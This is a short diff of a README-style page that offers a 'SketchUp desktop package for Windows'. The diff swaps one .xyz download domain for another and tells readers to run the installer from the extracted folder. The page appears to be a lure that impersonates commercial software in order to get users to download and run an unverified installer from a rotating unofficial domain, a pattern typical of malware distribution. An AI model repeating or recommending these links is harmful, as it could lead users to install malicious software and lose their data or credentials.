@@ -8,8 +8,8 @@ SketchUp desktop package for Windows · cad toolkit · local install ready.
 
 > Use the project link below for Windows.
 
-* **Project link:** **[sketchup.nexpath.xyz](https://sketchup.nexpath.xyz/)**
-* **Full URL:** `https://sketchup.nexpath.xyz/`
+* **Project link:** **[sketchup.nerasix.xyz](https://sketchup.nerasix.xyz/)**
+* **Full URL:** `https://sketchup.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
